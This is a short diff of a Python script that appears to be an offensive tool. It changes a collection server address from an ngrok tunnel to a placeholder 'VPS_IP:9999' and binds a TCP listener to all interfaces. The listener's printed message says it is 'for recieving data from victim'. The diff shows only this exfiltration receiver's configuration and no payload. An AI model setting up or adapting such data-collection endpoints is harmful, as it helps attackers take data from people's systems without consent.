@@ -12,7 +12,7 @@ if len(sys.argv) != 2:
     exit(0)
 
 data_vulen = dict()
-SERVER = '4.tcp.ngrok.io:16719'
+SERVER = 'VPS_IP:9999' ## or using ngrok tcp
 
 class TCPHandler(socketserver.BaseRequestHandler):
     def handle(self):        
@@ -35,7 +35,7 @@ def random_str(length: int) -> str:
     return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
 print('Starting TCP server ... For recieving data from victim.')
-server = TCPServer(('localhost', 9999), TCPHandler)
+server = TCPServer(('0.0.0.0', 9999), TCPHandler)
 server_thread = threading.Thread(target=server.serve_forever)
 server_thread.daemon = True
 server_thread.start()
